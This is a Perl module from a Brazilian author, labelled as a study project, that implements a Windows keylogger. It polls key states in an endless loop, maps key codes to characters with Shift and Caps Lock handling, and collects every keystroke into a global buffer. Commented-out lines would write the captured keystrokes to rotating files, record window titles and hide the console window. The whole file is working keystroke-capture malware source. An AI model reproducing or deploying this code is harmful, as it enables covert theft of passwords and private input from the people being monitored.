# Projeto para estudo / Project to study
# By Mdh3ll
# mdh3ll@gmail.com
# Brazil

#############################################################################
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>
#############################################################################

package coliau;

use common::sense;
use strict;
use warnings;
use Win32::GuiTest qw(GetAsyncKeyState GetForegroundWindow GetWindowText);
use Win32::KeyState qw(:get); # this module here -> http://tinyurl.com/3xdmbrx
use Time::HiRes qw(usleep);
use FileHandle;
use Switch;

our $KEYLOG;

sub KeyLogger_new {

my($caps,$i,$I,$shift,$window,$window0,$LOG);

$|++;
$I=0;
$window = 0;

#open (OUT, ">>outkey".$I.".txt") || die "could not create test.out - $!"; ## out
#OUT->autoflush(1);

# ShowWindow(GetForegroundWindow(),SW_HIDE); # REMOVE THE # TO START HIDDEN.

#LOG("=" x 40 . "\n" ." [+] started : ".~~localtime(). "\n" . "=" x 40 . "\n");

while(1){ 

 #   if(-s OUT >= 1048576){
 #               close(OUT);
 #               $I++; 
 #               open (OUT, ">>outkey$I.txt") || die "could not create #test.out - $!";
 #       }
        
        
  #      $window0 = GetForegroundWindow(); # capture the active window title.
   #     if($window0 != $window){ $window = $window0; LOG(GetWindowText($window)."\n");}
        
        if(GetKeyState(20)==0){$caps=32;}else{$caps=0;} #checks the state of CAPSLOCK.
                for(8,9,13,16,32,187..193,219..222,226){
                        $i = $_;
                        if(GetAsyncKeyState($i) == -32767){
                                switch($i){
                                        case 8      {LOG ("\\b")}
                                        case 9      {LOG ("\\t")}
                                        case 13     {LOG ("\\n")}
                                        case 16     {callSHIFT()} # call sub callSHIFT.
                                        case 32     {LOG(' ')}
                                        case 187    {LOG('=')}
                                        case 188    {LOG(',')} 
                                        case 189    {LOG('-')} 
                                        case 190    {LOG('.')}
                                        case 191    {LOG(';')} 
                                        case 192    {LOG('\'')} 
                                        case 193    {LOG("/")} 
                                        case 219    {LOG('\\\'')} # (?)
                                        case 220    {LOG(']')} 
                                        case 221    {LOG('[')}
                                        case 222    {LOG('~')}
                                        case 226    {LOG('\\')}
                                }
                        }
                }
        
        for($i=48;$i<=57;$i++){ # Numbers 0-9.
                if (GetAsyncKeyState($i) == -32767){
                        LOG(chr($i));
                } 
        }

        CHR($caps);
        usleep(1000); # reduces consumption of CPU.
}
}


sub callSHIFT {
        my $shift = 1;
        while($shift == 1){
                for(48..57,187..193,219..222,226){
                        my $i = $_;
                        if(GetAsyncKeyState($i) == -32767){
                                switch ($i){
                                        case 48     {LOG(')')}
                                        case 49     {LOG('!')}
                                        case 50     {LOG('@')}
                                        case 51     {LOG('#')}
                                        case 52     {LOG('$')}
                                        case 53     {LOG('%')}
                                        case 54     {LOG('?')}
                                        case 55     {LOG('&')}
                                        case 56     {LOG('*')}
                                        case 57     {LOG('(')}
                                        case 187    {LOG('+')}
                                        case 188    {LOG('<')}
                                        case 189    {LOG('_')}
                                        case 190    {LOG('>')}          
                                        case 191    {LOG(':')} 
                                        case 192    {LOG('"')}          
                                        case 193    {LOG('?')} 
                                        case 219    {LOG('/\'')} # (`)
                                        case 220    {LOG('}')} 
                                        case 221    {LOG('{')}  
                                        case 222    {LOG('^')}
                                        case 226    {LOG('|')}
                                }
                        }
                }
                CHR(0,7);
                if(!GetAsyncKeyState(16) == 1){ $shift = 0; } # checks the state of SHIFT.
    }
}

sub CHR {
        my $caps = shift;
        for(my $i=65;$i<=90;$i++){
                if(GetAsyncKeyState($i) == -32767){
                        LOG(chr($i+$caps));
                } # letters a-z A-Z
    }
        usleep(1000) # reduces consumption of CPU.
}

sub LOG {
        my $LOG = shift;
		$KEYLOG .= $LOG;
#        print $LOG;
#        print OUT $LOG;
}

1;
